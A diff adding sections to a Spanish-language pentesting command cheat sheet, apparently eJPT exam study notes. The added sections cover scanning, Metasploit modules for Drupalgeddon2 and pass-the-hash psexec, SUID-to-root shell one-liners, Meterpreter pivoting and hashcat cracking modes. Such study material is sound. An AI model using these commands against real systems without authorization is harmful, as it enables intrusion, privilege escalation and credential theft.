@@ -4,6 +4,41 @@ Resumen de todos los comandos del vault, organizado por fases de pentesting.
 
 ---
 
+## 0. METODOLOGÍA DE EXAMEN eJPT
+
+1. **Lee TODAS las preguntas antes de tocar cualquier herramienta** — las preguntas te dicen qué buscar.
+2. **Reconocimiento inicial** (one-liners de arranque):
+   ```bash
+   netdiscover -r 192.168.x.x/24
+   nmap -Pn -sS -sV -sC -T4 -p- -O -oN scan_result.txt <target_ip>
+   ```
+3. **Red layout:** normalmente hay una **DMZ** + una **red interna** (alcanzable solo vía *pivoting* desde un host dual-homed).
+
+### Tips clave del examen
+- Leer todas las preguntas primero.
+- **Reusar credenciales** en todos los servicios.
+- Guardar output de nmap en archivo (`-oN`).
+- Anonymous FTP y SMB sin credenciales → revisar siempre.
+- Buscar el host **dual-homed** (`ipconfig /all` / `ip a`) para pivotar a la red interna.
+- La mayoría termina en 4–12h de las 48h disponibles.
+
+### Herramientas principales
+| Tool | Uso |
+|---|---|
+| Nmap | Scanning y enumeración |
+| Metasploit | Explotación y post-explotación |
+| Hydra | Brute force de credenciales |
+| John / Hashcat | Cracking de hashes |
+| Gobuster / ffuf | Web directory fuzzing |
+| WPScan | WordPress vuln scanning |
+| smbclient / enum4linux | SMB enumeration |
+| netcat | Reverse shells |
+| CrackMapExec / NetExec | SMB credential spraying |
+
+> **Verificar instalación:** correr `./check-tools.sh` (en la raíz del vault) en el Linux de ataque para comprobar que todas estas herramientas estén instaladas y funcionando. Si da `bad interpreter: ...^M`, convertir con `sed -i 's/\r$//' check-tools.sh`.
+
+---
+
 ## 1. RECONOCIMIENTO / INFORMATION GATHERING (OSINT)
 
 ### SSL/Certificados — Descubrir subdominios
@@ -58,6 +93,7 @@ for i in $(cat subdomainlist); do host $i | grep "has address" | cut -d" " -f1,4
 
 ### Descubrimiento de hosts
 ```bash
+netdiscover -r 192.168.x.x/24                                  # Descubrimiento ARP (red local)
 sudo nmap <RED>/24 -sn -oA tnet | grep for | cut -d" " -f5
 sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5
 ```
@@ -428,6 +464,34 @@ xfreerdp /v:<IP> /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution /dri
 evil-winrm -i <IP> -u <user> -p <password>
 evil-winrm-py -i <IP> -u Administrator -p '<password>'
 ```
+
+---
+
+### CMS — WordPress
+
+```bash
+wpscan --url http://<target>/wp/ -e vp,u        # Enumerar plugins vulnerables + usuarios
+# CVE-2020-25213 (wp-file-manager → RCE unauthenticated)
+
+# Si obtienes acceso a la DB, dumpear credenciales:
+# SELECT user_login, user_pass FROM wp_users;
+john --wordlist=/usr/share/wordlists/rockyou.txt wp_hashes.txt
+```
+
+### CMS — Drupal (Drupalgeddon2, CVE-2018-7600)
+
+```bash
+curl http://<target>/drupal/CHANGELOG.txt      # Verificar versión (< 7.58 / 8.5.1 = vulnerable)
+```
+```bash
+# Metasploit
+use exploit/unix/webapp/drupal_drupalgeddon2
+set RHOSTS <target>
+set TARGETURI /drupal
+set LHOST <your_ip>
+run
+```
+**Clave:** Drupal guarda hashes con prefijo `$S$` → crackear con `hashcat -m 7900`.
 
 ---
 
@@ -892,6 +956,14 @@ evil-winrm -i <IP> -u <user> -p <password>
 impacket-psexec <user>:'<NTLM_HASH>'@<IP>
 crackmapexec smb <IP> -u <user> -H <NTLM_HASH>
 ```
+```bash
+# Metasploit psexec con hash NTLM (formato LM:NT)
+use exploit/windows/smb/psexec
+set RHOSTS <IP>
+set SMBUser <user>
+set SMBPass aad3b435b51404eeaad3b435b51404ee:<ntlm_hash>
+run
+```
 
 ---
 
@@ -950,10 +1022,39 @@ upload / download
 sudo -l                           # Ver permisos sudo
 id                                # Ver grupos (¡grupo docker = root!)
 find / -perm -4000 -type f 2>/dev/null  # Archivos SUID
+find / -perm -u=s -type f 2>/dev/null   # Equivalente (otra sintaxis)
 find / -group operator 2>/dev/null      # Archivos por grupo no estándar
 ss -tlnp                          # Puertos internos
 cat /etc/gshadow                  # Ver miembros de grupos
 ```
+
+### SUID → Root (abuso GTFOBins)
+```bash
+# find con SUID bit → ejecutar shell preservando el EUID root (-p)
+/usr/bin/find . -exec /bin/bash -p \; -quit
+
+# bash SUID → shell root directa
+/bin/bash -p
+
+# nmap SUID (modo interactivo, versiones antiguas 2.02-5.21)
+nmap --interactive
+nmap> !sh
+
+# vim/vi SUID → shell root
+vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'
+
+# less/more SUID → escapar a shell
+less /etc/profile
+# luego escribir: !/bin/sh
+
+# cp SUID → sobreescribir /etc/passwd o leer archivos root
+# env SUID → env /bin/sh -p
+env /bin/sh -p
+
+# python SUID → setuid(0)
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+**Clave:** Consultar [GTFOBins](https://gtfobins.github.io/) para CADA binario SUID encontrado — buscar el binario → sección "SUID" → copiar el comando. El flag `-p` en bash es esencial para no perder el EUID root.
 
 ### Docker group → Root (Kobold)
 ```bash
@@ -992,6 +1093,44 @@ make
 ssh -L 8765:127.0.0.1:8765 <user>@<IP>
 # Exponer puerto interno localmente para Metasploit
 ```
+
+### Pivoting con Metasploit (red interna vía host dual-homed)
+```bash
+# 1. En la sesión Meterpreter del host comprometido, identificar la segunda red
+ipconfig /all          # Windows → buscar host dual-homed (2 interfaces)
+ip a                   # Linux
+
+# 2. Agregar ruta a la red interna a través de la sesión
+route add 192.168.0.0/24 <session_id>
+# o automático desde Meterpreter:  run autoroute -s 192.168.0.0/24
+
+# 3. Escanear la red interna a través del pivote
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.0.0/24
+run
+```
+**Clave:** La red interna solo es alcanzable a través del host dual-homed — la ruta hace que Metasploit enrute el tráfico por esa sesión.
+
+```bash
+# Port Forwarding dentro de Meterpreter (exponer UN puerto interno en tu Kali)
+meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.0.50
+# Ahora conectas a 127.0.0.1:3389 en Kali → llega al host interno
+xfreerdp /v:127.0.0.1 /u:admin /p:'<pass>'
+meterpreter > portfwd list
+meterpreter > portfwd delete -l 3389 -p 3389 -r 192.168.0.50
+```
+
+```bash
+# SOCKS proxy → usar CUALQUIER herramienta de Kali contra la red interna
+use auxiliary/server/socks_proxy
+set SRVPORT 1080
+set VERSION 4a
+run -j
+# Editar /etc/proxychains4.conf → agregar:  socks4 127.0.0.1 1080
+proxychains nmap -sT -Pn 192.168.0.50
+proxychains crackmapexec smb 192.168.0.0/24
+```
+**Clave:** `route`/`autoroute` sirve solo dentro de Metasploit; para herramientas externas (nmap, cme, evil-winrm) necesitas `socks_proxy` + `proxychains`, o `portfwd` para un puerto puntual.
 
 ### Credenciales en .env / archivos de configuración
 ```bash
@@ -1033,6 +1172,8 @@ hashcat -a 0 -m 0 <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/
 hashcat -a 3 -m 0 <hash> '?u?l?l?l?l?d?s'
 
 # Modos específicos
+hashcat -m 1000 hashes.txt rockyou.txt       # NTLM (hashes SAM/Windows)
+hashcat -m 7900 drupal_hashes.txt rockyou.txt # Drupal 7 ($S$)
 hashcat -m 7300 hash_only.txt rockyou.txt    # IPMI2 RAKP HMAC-SHA1
 hashcat -m 1410 'HASH:WingFTP' rockyou.txt   # SHA-256 con salt WingFTP
 hashcat -m 3200 '$2y$10$<bcrypt>' rockyou.txt  # bcrypt
